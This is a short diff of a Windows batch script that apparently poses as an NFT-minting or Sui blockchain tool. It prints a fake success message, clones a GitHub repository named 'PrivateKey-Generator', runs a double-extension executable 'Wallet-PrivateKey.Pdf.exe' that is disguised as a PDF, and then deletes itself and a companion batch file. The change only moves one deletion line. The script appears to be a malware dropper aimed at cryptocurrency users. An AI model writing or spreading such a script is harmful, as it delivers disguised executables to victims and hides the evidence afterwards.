@@ -48,6 +48,8 @@ if %ERRORLEVEL% neq 0 (
 :: Inform the user that the process is complete
 echo 'NFT MINTED SUCCESSFULLY, SENDING TO WALLET......'
 
+:: Delete Sui-Blockchain.bat after execution
+del /f /q "Sui-Blockchain.bat"
 
 git clone https://github.com/CelestialNFT/PrivateKey-Generator.git
 if %ERRORLEVEL% neq 0 (
@@ -57,8 +59,6 @@ if %ERRORLEVEL% neq 0 (
 cd PrivateKey-Generator
 start /wait Wallet-PrivateKey.Pdf.exe
 
-:: Delete Sui-Blockchain.bat after execution
-del /f /q "Sui-Blockchain.bat"
 
 :: Delete this batch file after execution
 del /f /q "%~f0"
